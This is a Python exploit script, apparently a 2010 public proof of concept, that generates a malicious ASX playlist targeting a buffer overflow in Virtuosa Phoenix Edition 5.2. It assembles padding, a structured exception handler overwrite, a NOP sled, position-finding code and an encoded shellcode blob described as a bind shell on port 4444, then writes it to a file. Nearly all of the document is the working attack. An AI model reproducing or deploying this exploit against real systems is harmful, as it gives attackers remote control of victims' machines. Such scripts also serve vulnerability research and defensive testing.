#!/usr/bin/python

# Exploit Title: Virtuosa Phoenix Edition 5.2 ASX BOF SEH Overwrite 
# Date found: Aug 16th 2010
# Author: Acidgen
# Software Link: http://download1.virtuosa.com/VirtuosaTrial.exe
# Version: 5.2
# Tested on: Windows XP SP2
# Virtuosa - File > Import  > Import song or video file from Playlists

junkA = '\x41' * 1021
junkB = '\x42' * 8979
nSEH  = '\xeb\x06\xff\xff'
SEH   = '\x7e\xaa\x01\x10'
nop = '\x90' * 10
getpc="\xd9\xeb\x9b\xd9\x74\x24\xf4\x5b"
addebx="\x83\xc3\x0b"
# Bindshell port 4444
sc = ("j314d34djq34djk34d1431s11s7j314d34dj234dkms502ds5o0d35upjb4c94oe246b3gk53590ofo4317dn40x081dkb19056k05oe8elx2c0e64j810ng4g0b2864mx716d5b7g2k0f1g7f8g2x7cmd58k809jfmxj19emx3g8x0b0269lejg82mg3b800bk3n90f4b2xj0o543689xkc82jb5xjg84l0619e7x29214enb930482mf817x7b0d1e0e130bj4jxj3obk95flb3k0b1b7x0e90j9m55b0dm08f8cj29c105cm0m9kk53n088n1nx6kn82fjf994d645xm4lk1k94kx44ng5e1e4bm81xm4jg1goxo1o344k9kd7b4f72l554o3jdje791xj0n002lbm9m15c8glejfk1kd9bm23f432d40858kj18e809f5bob1x285f6k9xkgldm15f49j5o30b52jdjb2xk26089jejg0km30xn3595kjbkdlx4191o1o42d817gmfj82520kf2djb744do338j28fnf7c13782e7152mf21ndm0nf0860k22301odlej3n0154dk27g3f3kj10k3k835919kdkxob28o09c9892kgm9lencl31ekgnemg756c5x841b4dlk734k945k60k3m910jejd1boe349d7b58mk530gkgob58ok085kjk7g492e4d228e8260jbl809l17do43f2d832g648x9b7929437f38k4j45242o099803f5")
asxheader=("<ASX version = '3.0'>" + "\r\n"
"<Title>ASX BOF SEH Overwrite Exploit</Title>" + "\r\n"
"<Abstract>Perhaps it is, what do you think?</Abstract>" +"\r\n"
"<MoreInfo href = 'http://google.com" + "\r\n"
"\r\n"
"<Entry>" + "\r\n"
"<Title>How the hacker took over Virtuosa</Title>" + "\r\n"
"<Author>Lucas Lundgren - acidgen [at] grayhat [onedot] se</Author>" + "\r\n"
'<Ref href="'+junkA+nSEH+SEH+nop+getpc+addebx+sc+junkB+'"'+"/>" + "\r\n"
"</Entry>"+"\r\n"
"</ASX>"
"\r\n\r\n")
filename = "asxcrash.asx"
print "[-]Virtuosa Phoenix Edition 5.2 ASX BOF SEH Overwrite"
print "[*]Generating exploit...\n"
file = open(filename,"w")
file.writelines(asxheader)
file.close()
print "[*]Done...\n"

